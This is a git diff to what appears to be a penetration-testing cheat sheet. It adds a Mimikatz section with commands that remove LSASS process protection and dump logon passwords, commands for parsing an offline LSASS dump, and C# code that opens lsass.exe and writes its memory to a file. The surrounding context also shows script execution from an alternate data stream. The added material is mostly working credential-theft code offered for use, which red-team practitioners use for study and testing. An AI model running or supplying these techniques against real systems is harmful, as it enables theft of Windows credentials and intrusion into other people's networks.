@@ -74,6 +74,13 @@ Enjoy creating your own 🦠
 
 <br>
 
+# [MimiKatz](#Mimikatz)
+- [Disable LSA](#Disable_LSA_and_Dump)
+-  [Offline Dump](#Offline_Dump)
+-  [Minidump](#MiniDump)
+
+<br>
+
 # [MetaSploit](#Metasploit-1)
 - [Msfvenom](#Msfvenom)
 - [Metasploit_Refs](#Metasploit_Refs)
@@ -1172,10 +1179,58 @@ accesschk.exe "currentuser" C:\Windows -wus
 3. Verify - dir /r “C:\windows\somefile.log”
 4. wscript “C:\windows\somefile.log:test.js”
 ```
+<br>
+<br>
 
-### Mimikatz
+# Mimikatz
+
+### Disable_LSA_and_Dump
+```powershell
+1. +!
+2. !processprotect /process:lsass.exe /remove
+3. sekurlsa::logonpasswords
+```
+<br>
+
+### Offline_Dump
+```powershell
+1. sekurlsa::minidump lsass.dmp
+2. sekurlsa::logonpasswords
+```
+<br>
+
+### Minidump
+```csharp
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+namespace MiniDump
+{
+class Program
+{
+[DllImport("Dbghelp.dll")]
+static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
+IntPtr hFile, int DumpType, IntPtr ExceptionParam,
+IntPtr UserStreamParam, IntPtr CallbackParam);
+[DllImport("kernel32.dll")]
+static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
+int processId);
+static void Main(string[] args)
+{
+FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp",
+FileMode.Create);
+Process[] lsass = Process.GetProcessesByName("lsass");
+int lsass_pid = lsass[0].Id;
+IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
+bool dumped = MiniDumpWriteDump(handle, lsass_pid,
+dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero,
+IntPtr.Zero);
+```
+<br>
 
 - [Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
+
 
 
 ### Windows_Privilege_Escalation
